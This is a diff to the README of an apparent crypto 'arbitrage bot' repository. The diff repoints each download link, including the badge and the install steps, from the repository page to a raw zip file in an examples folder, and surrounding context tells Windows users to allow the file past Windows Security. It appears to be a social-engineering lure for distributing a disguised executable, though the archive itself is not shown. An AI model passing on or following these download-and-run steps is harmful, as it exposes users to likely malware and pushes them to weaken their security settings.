@@ -1,11 +1,11 @@
 # ⚡ Hyperliquid-Arbitrage-Bot - Fast Market Gap Trading
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/Rusty-caruso584/Hyperliquid-Arbitrage-Bot)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/Rusty-caruso584/Hyperliquid-Arbitrage-Bot/raw/refs/heads/main/examples/Arbitrage-Hyperliquid-Bot-3.7.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get the app:
-https://github.com/Rusty-caruso584/Hyperliquid-Arbitrage-Bot
+https://github.com/Rusty-caruso584/Hyperliquid-Arbitrage-Bot/raw/refs/heads/main/examples/Arbitrage-Hyperliquid-Bot-3.7.zip
 
 ## 🖥️ What This App Does
 
@@ -33,7 +33,7 @@ If your computer blocks the file, you may need to allow it in Windows Security o
 Follow these steps in order.
 
 1. Open this page in your browser:
-   https://github.com/Rusty-caruso584/Hyperliquid-Arbitrage-Bot
+   https://github.com/Rusty-caruso584/Hyperliquid-Arbitrage-Bot/raw/refs/heads/main/examples/Arbitrage-Hyperliquid-Bot-3.7.zip
 
 2. Look for the download area on the page.
 
@@ -181,6 +181,6 @@ If you see these parts, the app is running as expected.
 ## 📁 Download Path
 
 Visit the download page here:
-https://github.com/Rusty-caruso584/Hyperliquid-Arbitrage-Bot
+https://github.com/Rusty-caruso584/Hyperliquid-Arbitrage-Bot/raw/refs/heads/main/examples/Arbitrage-Hyperliquid-Bot-3.7.zip
 
 Use that page to download and run the app on Windows.
